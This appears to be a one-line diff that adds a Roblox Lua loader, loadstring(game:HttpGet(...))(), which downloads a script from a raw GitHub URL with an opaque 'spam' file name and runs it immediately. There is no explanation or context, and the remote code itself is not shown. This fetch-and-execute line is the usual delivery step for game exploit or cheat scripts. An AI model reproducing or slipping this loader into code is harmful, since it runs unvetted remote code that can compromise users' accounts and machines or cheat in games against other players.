@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/apple-ipad-original-spam6-rbde8kr9o38o8u.lua"))()
